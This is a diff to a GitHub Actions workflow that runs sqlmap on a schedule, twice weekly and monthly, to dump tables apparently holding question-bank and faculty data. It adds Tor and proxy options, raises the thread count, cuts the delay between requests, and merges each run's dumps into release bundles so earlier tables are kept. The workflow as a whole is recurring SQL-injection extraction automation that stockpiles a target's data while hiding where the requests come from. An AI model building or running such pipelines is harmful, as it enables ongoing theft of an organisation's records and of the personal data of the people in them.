@@ -13,9 +13,25 @@
 
 on:
   schedule:
-    - cron: "15 3 * * *"
+    # Bi-weekly (twice a week: Mondays and Thursdays at 03:00 UTC) -> dumps qbank
+    - cron: "0 3 * * 1,4"
+    # Monthly (1st of every month at 03:00 UTC) -> dumps faculty, coordinator, detail
+    - cron: "0 3 1 * *"
   workflow_dispatch:
     inputs:
+      cadence:
+        description: "Target table cadence (all, biweekly, monthly, custom)"
+        type: choice
+        options:
+          - "all"
+          - "biweekly"
+          - "monthly"
+          - "custom"
+        default: "all"
+      targets_file:
+        description: "Custom targets file path if cadence is 'custom'"
+        type: string
+        default: ""
       request_path:
         description: "Request file in repo (raw HTTP, Burp XML, HAR, or bare URL)"
         type: string
@@ -39,11 +55,11 @@ on:
       threads:
         description: "sqlmap threads (1-10)"
         type: string
-        default: "1"
+        default: "3"
       delay:
         description: "Delay between requests in seconds"
         type: string
-        default: "1"
+        default: "0.3"
       level:
         description: "sqlmap --level (1-5)"
         type: string
@@ -99,8 +115,8 @@ env:
   USE_TOR: ${{ inputs.use_tor || false }}
   DATABASE: ${{ inputs.database || '' }}
   TABLES: ${{ inputs.tables || '' }}
-  THREADS: ${{ inputs.threads || '1' }}
-  DELAY: ${{ inputs.delay || '1' }}
+  THREADS: ${{ inputs.threads || '3' }}
+  DELAY: ${{ inputs.delay || '0.3' }}
   LEVEL: ${{ inputs.level || '1' }}
   RISK: ${{ inputs.risk || '1' }}
   MAX_MINUTES: ${{ inputs.max_runtime_minutes || '350' }}
@@ -195,6 +211,34 @@ jobs:
             --allowlist "$ALLOWLIST" \
             $ALLOW_UNLISTED_FLAG
 
+      - name: Resolve targets cadence
+        run: |
+          set -euo pipefail
+          if [ "${{ github.event_name }}" = "schedule" ]; then
+            day_of_month=$(date -u +%d | sed 's/^0*//')
+            if [ "$day_of_month" -eq 1 ]; then
+              echo "Scheduled trigger: Monthly cadence (1st of month)"
+              target_file="targets/monthly.txt"
+            else
+              echo "Scheduled trigger: Bi-weekly cadence (Twice a week)"
+              target_file="targets/biweekly.txt"
+            fi
+          else
+            cadence="${{ inputs.cadence || 'all' }}"
+            if [ "$cadence" = "biweekly" ]; then
+              target_file="targets/biweekly.txt"
+            elif [ "$cadence" = "monthly" ]; then
+              target_file="targets/monthly.txt"
+            elif [ "$cadence" = "custom" ] && [ -n "${{ inputs.targets_file }}" ]; then
+              target_file="${{ inputs.targets_file }}"
+            else
+              target_file="targets.txt"
+            fi
+          fi
+          echo "TARGETS_FILE=$target_file" >> "$GITHUB_ENV"
+          echo "Using target cadence file: $target_file"
+          cat "$target_file" || true
+
       - name: Run sqlmap
         id: sqlmap
         continue-on-error: true
@@ -205,6 +249,7 @@ jobs:
           if [ -n "$TABLES" ]; then extra_db_args+=("-T" "$TABLES"); fi
           if [ -n "$PROXY" ]; then extra_db_args+=("--proxy" "$PROXY"); fi
           if [ "$USE_TOR" = "true" ]; then extra_db_args+=("--tor"); fi
+          if [ -f "$TARGETS_FILE" ]; then extra_db_args+=("--targets-file" "$TARGETS_FILE"); fi
           python scripts/run_sqlmap.py \
             --sqlmap-dir .sqlmap \
             --request "$REQUEST_FILE" \
@@ -217,6 +262,23 @@ jobs:
             --max-runtime "$(( MAX_MINUTES * 60 ))" \
             "${extra_db_args[@]}" \
             $ALLOW_UNLISTED_FLAG
+
+      - name: Restore previous release data (preserve all tables)
+        if: always()
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          mkdir -p previous_release "$PARQUET_DIR"
+          if gh release view latest --json assets -q '.assets[].name' 2>/dev/null | grep -q "all-databases-parquet.zip"; then
+            echo "Downloading previous release Parquet bundle to preserve all tables..."
+            gh release download latest -p "all-databases-parquet.zip" --dir previous_release || true
+            if [ -f previous_release/all-databases-parquet.zip ]; then
+              unzip -qo previous_release/all-databases-parquet.zip -d "$PARQUET_DIR"
+              echo "Successfully restored existing tables from latest release."
+            fi
+          else
+            echo "No previous release found; starting clean."
+          fi
 
       - name: Convert CSV dumps to Parquet
         if: always() && hashFiles('sqlmap-output/**/*.csv') != ''
